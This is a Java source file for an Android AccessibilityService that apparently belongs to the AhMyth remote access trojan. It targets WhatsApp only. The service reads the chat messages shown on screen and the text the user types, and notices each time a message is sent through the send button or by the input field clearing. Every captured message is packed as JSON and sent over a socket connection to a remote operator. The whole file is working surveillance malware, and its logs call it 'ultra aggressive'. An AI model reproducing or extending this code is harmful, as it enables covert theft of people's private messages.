package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;

import java.util.ArrayList;

public class WhatsAppAccessibilityService extends AccessibilityService {

    private String lastMessageText = "";
    private long lastSentTimestamp = 0;
    private boolean wasTextNonEmpty = false;

    private String lastCapturedMessage = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_CLICKED
                        | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                        | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.packageNames = new String[]{"com.whatsapp"};
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
        Log.i("WhatsAppAccessibility", "Servicio conectado (ULTRA AGRESIVO + Captura árbol de mensajes)");
    }

    private void logAllNodes(AccessibilityNodeInfo node, int depth) {
        if (node == null) return;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < depth; i++) sb.append("  ");
        sb.append("Clase: ").append(node.getClassName());
        sb.append(" | Id: ").append(node.getViewIdResourceName());
        sb.append(" | Texto: ").append(node.getText());
        sb.append(" | Desc: ").append(node.getContentDescription());
        sb.append(" | Clickable: ").append(node.isClickable());
        sb.append(" | Focused: ").append(node.isFocused());
        sb.append(" | Enabled: ").append(node.isEnabled());
        Log.d("WhatsAppAccessibility", sb.toString());

        for (int i = 0; i < node.getChildCount(); i++) {
            logAllNodes(node.getChild(i), depth + 1);
        }
    }

    private String findFirstEditTextWithContent(AccessibilityNodeInfo node) {
        if (node == null) return "";
        if ("android.widget.EditText".equals(node.getClassName())) {
            CharSequence cs = node.getText();
            if (cs != null && !cs.toString().isEmpty()) return cs.toString();
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            String result = findFirstEditTextWithContent(node.getChild(i));
            if (!result.isEmpty()) return result;
        }
        return "";
    }

    private ArrayList<String> getAllMessages(AccessibilityNodeInfo node) {
        ArrayList<String> messages = new ArrayList<>();
        if (node == null) return messages;
        if ("android.widget.TextView".equals(node.getClassName()) &&
            "com.whatsapp:id/message_text".equals(node.getViewIdResourceName())) {
            CharSequence cs = node.getText();
            if (cs != null && !cs.toString().isEmpty()) {
                messages.add(cs.toString());
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            messages.addAll(getAllMessages(node.getChild(i)));
        }
        return messages;
    }

    private void delayedTreeLog() {
        new Handler().postDelayed(() -> {
            AccessibilityNodeInfo delayedRoot = getRootInActiveWindow();
            if (delayedRoot != null) {
                Log.d("WhatsAppAccessibility", "-- Árbol con retraso --");
                logAllNodes(delayedRoot, 0);
                detectAndReportLastMessage(delayedRoot);
            } else {
                Log.d("WhatsAppAccessibility", "-- RootNode con retraso es NULL --");
            }
        }, 400);
    }

    private void detectAndReportLastMessage(AccessibilityNodeInfo rootNode) {
        ArrayList<String> currentMessages = getAllMessages(rootNode);
        if (!currentMessages.isEmpty()) {
            String lastMsg = currentMessages.get(currentMessages.size() - 1);
            if (!lastMsg.equals(lastCapturedMessage)) {
                lastCapturedMessage = lastMsg;
                Log.d("WhatsAppAccessibility", "Mensaje detectado en chat: " + lastMsg);

                JSONObject object = new JSONObject();
                try {
                    object.put("package", "com.whatsapp");
                    object.put("title", "Yo");
                    object.put("text", lastMsg);
                    object.put("direction", "sent");
                } catch (Exception e) {}

                if (IOSocket.getInstance().getIoSocket() != null &&
                        IOSocket.getInstance().getIoSocket().connected()) {
                    IOSocket.getInstance().getIoSocket().emit("notification", object);
                }
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d("WhatsAppAccessibility", "== Comienza onAccessibilityEvent ==");
        if (event.getPackageName() == null ||
            !event.getPackageName().toString().equals("com.whatsapp")) {
            Log.d("WhatsAppAccessibility", "Evento de otro paquete o paquete nulo");
            return;
        }

        Log.d("WhatsAppAccessibility", "Evento recibido: " + event.getEventType());

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            Log.d("WhatsAppAccessibility", "Árbol de views:");
            logAllNodes(rootNode, 0);
            detectAndReportLastMessage(rootNode);
        } else {
            Log.d("WhatsAppAccessibility", "RootNode es NULL");
        }

        delayedTreeLog();

        try {
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null && "android.widget.EditText".equals(source.getClassName())) {
                    String newText = event.getText().size() > 0 ? event.getText().get(0).toString() : "";
                    Log.d("WhatsAppAccessibility", "EditText antes: " + lastMessageText + " | ahora: " + newText);

                    if (wasTextNonEmpty && newText.isEmpty() && !lastMessageText.isEmpty()) {
                        long now = System.currentTimeMillis();
                        if (now - lastSentTimestamp > 500) {
                            JSONObject object = new JSONObject();
                            object.put("package", "com.whatsapp");
                            object.put("title", "Yo");
                            object.put("text", lastMessageText);
                            object.put("direction", "sent");

                            Log.d("WhatsAppAccessibility", "DETECTADO ENVÍO POR LIMPIEZA DE CAMPO: " + lastMessageText);
                            if (IOSocket.getInstance().getIoSocket() != null &&
                                    IOSocket.getInstance().getIoSocket().connected()) {
                                IOSocket.getInstance().getIoSocket().emit("notification", object);
                            }
                            lastSentTimestamp = now;
                        }
                        lastMessageText = "";
                        wasTextNonEmpty = false;
                    } else {
                        wasTextNonEmpty = !newText.isEmpty();
                        lastMessageText = newText;
                        Log.d("WhatsAppAccessibility", "Texto actual: " + lastMessageText);
                    }
                }
            }

            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    String className = source.getClassName() != null ? source.getClassName().toString() : "";
                    String viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName() : "";

                    Log.d("WhatsAppAccessibility", "CLICK detectado - class: " + className + " viewId: " + viewId);

                    if ((className.equals("android.widget.ImageButton") || className.equals("android.widget.ImageView"))
                            && viewId != null && (viewId.contains("send") || viewId.contains("draft_send"))) {

                        long now = System.currentTimeMillis();
                        if (now - lastSentTimestamp > 500) {
                            AccessibilityNodeInfo rn = getRootInActiveWindow();
                            Log.d("WhatsAppAccessibility", "Recorriendo árbol de views tras SEND:");
                            logAllNodes(rn, 0);
                            detectAndReportLastMessage(rn);

                            String currentMessageText = findFirstEditTextWithContent(rn);
                            if (currentMessageText.isEmpty()) {
                                currentMessageText = lastMessageText;
                            }

                            JSONObject object = new JSONObject();
                            object.put("package", "com.whatsapp");
                            object.put("title", "Yo");
                            object.put("text", currentMessageText);
                            object.put("direction", "sent");

                            Log.d("WhatsAppAccessibility", "DETECTADO ENVÍO POR CLICK: " + currentMessageText);
                            if (IOSocket.getInstance().getIoSocket() != null &&
                                    IOSocket.getInstance().getIoSocket().connected()) {
                                IOSocket.getInstance().getIoSocket().emit("notification", object);
                            }
                            lastSentTimestamp = now;
                        }
                        lastMessageText = "";
                        wasTextNonEmpty = false;
                    }
                } else {
                    Log.d("WhatsAppAccessibility", "CLICK detectado - source es NULL");
                }
            }
        } catch (Exception e) {
            Log.e("WhatsAppAccessibility", "Error en onAccessibilityEvent", e);
        }
        Log.d("WhatsAppAccessibility", "== Termina onAccessibilityEvent ==");
    }

    @Override
    public void onInterrupt() {
        Log.i("WhatsAppAccessibility", "Servicio interrumpido");
    }
}